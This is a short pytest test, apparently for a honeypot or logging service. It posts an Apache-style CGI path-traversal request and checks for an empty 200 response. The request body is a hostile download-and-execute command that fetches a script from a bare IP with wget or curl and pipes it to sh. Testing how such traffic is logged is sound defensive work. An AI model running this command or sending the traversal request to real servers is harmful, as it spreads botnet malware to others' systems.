import pytest


@pytest.mark.asyncio
async def test_dispatch_shell_body_logs_stdin_command(flux_client):
    payload = b"(wget --no-check-certificate -qO- https://204.76.203.196/sh || curl -sk https://204.76.203.196/sh) | sh -s apache.selfrep"
    resp = await flux_client.post(
        "/cgi-bin/.%2e/bin/sh",
        data=payload,
    )
    assert resp.status == 200
    assert await resp.read() == b""
